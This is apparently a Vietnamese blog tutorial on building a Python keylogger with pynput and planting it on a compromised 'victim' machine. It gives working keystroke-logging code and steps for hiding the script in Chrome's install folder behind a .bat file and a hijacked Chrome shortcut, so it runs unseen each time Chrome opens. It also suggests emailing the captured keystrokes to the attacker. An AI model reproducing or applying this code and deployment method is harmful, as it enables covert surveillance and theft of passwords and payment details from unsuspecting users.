# Keylogger

- Keylogger là một chương trình giúp chúng ta theo dõi được tổ hợp các phím được bấm trên bàn phím. Có vẻ hơi confused nhỉ, để dễ hiểu hơn mình sẽ lấy ví dụ, nếu bạn thực hiện gõ bất kì thứ gì trên bàn phím, Keylogger sẽ thực hiện theo dõi bạn vừa gõ những phím gì, sau đó lưu chúng vào một file, thường gọi là logfile, đặc biệt khá nguy hiểm nếu một số thông tin cá nhân nhạy cảm như username, mật khẩu, thông tin thẻ thanh toán trực tuyến,... của bạn đã bị theo dõi và lưu lại sau đó được chuyển đến tay kẻ xấu.
- mình tạo keylogger với thư viện **pynput** của python 

```python
from pynput.keyboard import Listener
def keypress(key):
    key=str(key)
    if(key == "Key.esc"):
        raise SystemExit(0)
    key = key.replace("'", "")
    if (key == "Key.space"):
        key = " "
    if (key == "Key.enter"):
        key = "\n"
    f = open('keylogger.txt', 'a', encoding='utf8')
    f.write(key)
    f.close()
    print(key)

obj = Listener(on_press=keypress)
obj.start()
obj.join()
```
- khi chạy file mình gõ các ký tự nó sẽ hiện lên terminal và lưu vào file keylogger.txt

![image](https://hackmd.io/_uploads/S1oc3jikR.png)

![image](https://hackmd.io/_uploads/ByGi2sjyC.png)

- khí đó nếu như mình đã chiếm được quyền điều khiển máy victim như bài trước mình khai thác với Metasploit xem <a href="https://hackmd.io/@monstercuong7/ry4Rb8RRT" > tạo đây </a>
- mình sẽ có thể upload được các file từ máy mình lên máy victim và kể cả file keylogger này 
- khi đó mình có thể cải tiến file keylogger, khi victim gõ được 50 ký tự trên bàn phím máy tính sẽ gửi mail cho mình nội dung đã thực hiện 
- và ví dụ mình muốn theo dõi trên chrome
- mình sẽ upload file keylogger vào thư mục "C:\Program Files\Google\Chrome\Application\" nơi chứa chrome


![image](https://hackmd.io/_uploads/rk7N6ojyA.png)

- sau đó mình tạo thêm 1 file keylogger.bat ở đây


![image](https://hackmd.io/_uploads/S1Sq6jskR.png)

- với nội dung như sau


![image](https://hackmd.io/_uploads/SkWhRjjJR.png)

- sau đó mình đổi nội dung shortcut lúc đầu từ "C:\Program Files\Google\Chrome\Application\chrome.exe" sang "C:\Program Files\Google\Chrome\Application\keylogger.bat"

![image](https://hackmd.io/_uploads/SJzKUhjk0.png)


- và khi victim nhấp vào shortcut chrome trên desktop file keylogger sẽ được chạy và nó sẽ chạy đồng thời ứng dụng chrome và file keylogger.pyw chạy ngầm để theo dõi bàn phím máy tính


![image](https://hackmd.io/_uploads/Hyiiz2j1R.png)
